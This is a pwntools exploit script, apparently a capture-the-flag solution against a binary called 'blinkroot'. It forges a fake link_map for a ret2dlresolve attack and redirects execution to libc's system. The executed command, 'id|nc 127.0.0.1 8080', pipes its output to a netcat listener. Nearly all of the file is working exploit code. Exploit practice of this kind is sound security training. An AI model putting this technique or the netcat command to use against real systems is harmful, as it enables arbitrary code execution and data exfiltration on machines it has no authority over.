from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
io = process("blinkroot")
elf = ELF("blinkroot")
libc = ELF("./libc.so.6")


def ret2dlresolve_with_fakelinkmap_x64(libc, fake_linkmap_addr, offset_of_two_addr):
    '''
    libc: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0xc0
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78
        0x78: 17, tag of the JMPREL
        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x88
        0x88: padding for the relocation entry of idx=0
        0x90: padding for the relocation entry of idx=0
        0x98: padding for the relocation entry of idx=0
        0xa0: p_r_offset, offset pointer to the resloved addr
        0xa8: r_info
        0xb0: append
      resolved addr
        0xb8: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0
        0xc0: 6, tag of the DT_SYMTAB
        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0
        0xd0: 0x0000030000000000
        0xd8: offset_of_two_addr
        0xe0: fake st_size
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x78
    '''
    linkmap = p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr+0xc0)

    linkmap += p64(17) + p64(fake_linkmap_addr + 0x88)
    linkmap += p64(0)*3
    # here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr
    linkmap += p64((libc.sym["__free_hook"]-libc.sym["__libc_start_main"]) & (2**64 - 1)) + p64(0x7) + p64(0)

    linkmap += p64(0)

    linkmap += p64(6) + p64(fake_linkmap_addr + 0xd0)

    linkmap += p64(0x0000030000000000) + \
        p64(offset_of_two_addr & (2**64 - 1))+p64(0)

    linkmap = linkmap.ljust(0xf8-0x68, 'A')
    linkmap += p64(fake_linkmap_addr + 0x78)

    return linkmap


# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
# .got.plt:0000000000600B48 qword_600B48    dq 0
target_addr = 0x600B40
data_addr = 0x600BC0
offset = target_addr-data_addr
payload = p64(offset & (2**64 - 1))
payload += p64(elf.got["__libc_start_main"])
payload += "id|nc 127.0.0.1 8080\x00".ljust(0x18,'a')
payload += ret2dlresolve_with_fakelinkmap_x64(libc, elf.got["__libc_start_main"], libc.sym["system"]-libc.sym["__libc_start_main"])
payload = payload.ljust(1024, 'A')
# gdb.attach(io)
io.send(payload)
io.interactive()